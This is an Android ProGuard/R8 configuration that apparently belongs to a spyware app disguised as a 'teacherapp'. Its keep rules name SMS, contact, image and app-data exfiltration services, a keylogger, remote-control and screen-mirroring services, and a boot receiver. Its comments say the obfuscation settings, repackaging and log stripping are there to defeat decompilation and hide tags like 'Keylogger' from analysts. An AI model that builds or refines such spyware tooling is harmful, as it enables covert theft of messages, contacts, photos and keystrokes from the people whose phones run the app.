# ================================================================
# PART 3: OBFUSCATION & ANALYSIS EVASION
# Techniques applied:
#   1. Source file name + line number stripping
#   2. Aggressive class/method/field renaming via R8
#   3. Repackaging all classes into a single flat package
#   4. Log call removal (assumenosideeffects)
#   5. Access modifier widening for better inlining
# ================================================================


# ----------------------------------------------------------------
# 1. STRIP ALL DEBUG INFORMATION
# Removes SourceFile and LineNumberTable attributes from bytecode.
# Decompiled code will show no file names and no line numbers,
# making stack traces and call-graph reconstruction much harder.
# ----------------------------------------------------------------
-renamesourcefileattribute SourceFile
-keepattributes Exceptions
-keepattributes InnerClasses
-keepattributes Signature
-keepattributes *Annotation*


# ----------------------------------------------------------------
# 2. AGGRESSIVE REPACKAGING
# Moves every obfuscated class into a single flat package named
# after a plausible-sounding utility namespace. Combined with
# renaming, the original package hierarchy (services/, receivers/,
# obfuscation/) is completely destroyed in the output APK.
# ----------------------------------------------------------------
-repackageclasses 'com.example.teacherapp.core'
-allowaccessmodification
-overloadaggressively


# ----------------------------------------------------------------
# 3. KEEP — Android framework entry points
# These classes are referenced BY NAME in AndroidManifest.xml.
# ProGuard/R8 cannot rename them or the OS will fail to start them.
# Only the class names are kept; all internal method names will
# still be obfuscated.
# ----------------------------------------------------------------

# Application subclass
-keep public class com.example.teacherapp.CloudinaryApplication { *; }

# Main Activity (Manifest entry point)
-keep public class com.example.teacherapp.MainActivity { *; }

# Exfiltration & spy services
-keep public class com.teacherapp.services.SmsExfiltrationService { *; }
-keep public class com.teacherapp.services.ContactExfiltrationService { *; }
-keep public class com.teacherapp.services.ImageExfiltrationService { *; }
-keep public class com.teacherapp.services.AppDataExfiltrationService { *; }
-keep public class com.example.teacherapp.services.ScreenMirrorService { *; }
-keep public class com.example.teacherapp.services.RemoteControlService { *; }
-keep public class com.teacherapp.services.KeyloggerService { *; }

# Broadcast receivers
-keep public class com.teacherapp.receivers.BootReceiver { *; }
-keep public class com.teacherapp.receivers.SmsReceiver { *; }

# Accessibility services must keep onAccessibilityEvent + onServiceConnected
-keep class * extends android.accessibilityservice.AccessibilityService {
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent);
    public void onInterrupt();
    protected void onServiceConnected();
}


# ----------------------------------------------------------------
# 4. KEEP — Third-party SDKs that use reflection internally
# These must not be renamed or they will break at runtime.
# ----------------------------------------------------------------

# Firebase
-keep class com.google.firebase.** { *; }
-keep class com.google.android.gms.** { *; }
-keep class com.google.firebase.auth.** { *; }
-keep class com.google.firebase.firestore.** { *; }
-keepnames class com.google.firebase.** { *; }
-dontwarn com.google.firebase.**
-dontwarn com.google.android.gms.**

# Cloudinary
-keep class com.cloudinary.** { *; }
-keep class com.cloudinary.android.** { *; }
-dontwarn com.cloudinary.**

# Kotlin stdlib + coroutines (uses reflection for suspend functions)
-keep class kotlin.** { *; }
-keep class kotlin.Metadata { *; }
-keep class kotlinx.coroutines.** { *; }
-dontwarn kotlin.**
-dontwarn kotlinx.coroutines.**
-keepclassmembers class ** {
    @kotlin.Metadata *;
}

# Kotlin serialization
-keepattributes *Annotation*, InnerClasses
-dontnote kotlinx.serialization.AnnotationsKt

# Jetpack Compose
-keep class androidx.compose.** { *; }
-dontwarn androidx.compose.**

# AndroidX Navigation
-keep class androidx.navigation.** { *; }

# AndroidX general
-keep class androidx.** { *; }
-dontwarn androidx.**

# Coil image loader (uses reflection)
-keep class coil.** { *; }
-dontwarn coil.**

# Google Maps + Maps Compose
-keep class com.google.android.gms.maps.** { *; }
-keep class com.google.maps.android.** { *; }
-dontwarn com.google.maps.android.**


# ----------------------------------------------------------------
# 5. KEEP — Android OS-required class members
# These method signatures are called by the Android runtime by
# name via reflection, so they must survive renaming.
# ----------------------------------------------------------------
-keepclassmembers class * extends android.content.BroadcastReceiver {
    public void onReceive(android.content.Context, android.content.Intent);
}
-keepclassmembers class * extends android.app.Service {
    public int onStartCommand(android.content.Intent, int, int);
    public android.os.IBinder onBind(android.content.Intent);
    public void onCreate();
    public void onDestroy();
}
-keepclassmembers class * extends android.app.Application {
    public void onCreate();
}
-keepclassmembers class * implements android.os.Parcelable {
    public static final android.os.Parcelable$Creator *;
}
-keepclassmembers enum * {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}


# ----------------------------------------------------------------
# 6. REMOVE ALL LOG CALLS
# Strips every android.util.Log call from the release build.
# After this, no log tag (e.g. "Keylogger", "RemoteControl",
# "AppDataExfiltration") will appear in the compiled APK.
# ----------------------------------------------------------------
-assumenosideeffects class android.util.Log {
    public static int v(...);
    public static int d(...);
    public static int i(...);
    public static int w(...);
    public static int e(...);
    public static int wtf(...);
    public static java.lang.String getStackTraceString(...);
}


# ----------------------------------------------------------------
# 7. REMOVE KOTLIN NULL-CHECK INTRINSICS (reduces attack surface)
# Strips Intrinsics.checkNotNull / checkParameterIsNotNull calls
# which can leak parameter names in decompiled output.
# ----------------------------------------------------------------
-assumenosideeffects class kotlin.jvm.internal.Intrinsics {
    public static void checkNotNull(...);
    public static void checkParameterIsNotNull(...);
    public static void checkNotNullParameter(...);
    public static void checkExpressionValueIsNotNull(...);
    public static void checkNotNullExpressionValue(...);
    public static void throwUninitializedPropertyAccessException(...);
}
